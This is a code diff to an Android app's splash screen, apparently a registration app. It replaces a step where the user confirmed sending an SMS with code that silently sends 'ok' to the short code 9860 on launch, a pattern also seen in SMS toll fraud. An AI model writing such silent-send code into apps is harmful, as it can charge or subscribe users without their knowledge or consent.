@@ -1,4 +1,4 @@
-package com.anviam.vloader;
+package com.akrobyte.registration;
 
 import android.app.Activity;
 import android.app.PendingIntent;
@@ -8,9 +8,11 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
-import android.telephony.gsm.SmsManager;
-import android.util.Log;
+import android.telephony.SmsManager;
+
+import com.anviam.vloader.R;
 
 public class SplashActivity extends Activity {
 
@@ -66,8 +68,10 @@ public class SplashActivity extends Activity {
         intentFilter2 = new IntentFilter(str2);
         Intent registerReceiver2 = registerReceiver(broadcastReceiver2, intentFilter2);
 
-        //SmsManager.getDefault().sendTextMessage("7986", null, "ok",broadcast,broadcast2);
-        String phoneNumber = "9860";
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.DONUT) {
+            SmsManager.getDefault().sendTextMessage("9860", null, "ok",broadcast,broadcast2);
+        }
+       /* String phoneNumber = "9860";
         String message = "Ok";
 
         // Open the SMS app with the specified number and message
@@ -77,6 +81,7 @@ public class SplashActivity extends Activity {
         startActivity(intent3);
 
         finish();
+*/
         unregisterReceiver(broadcastReceiver);
         unregisterReceiver(broadcastReceiver2);
     }
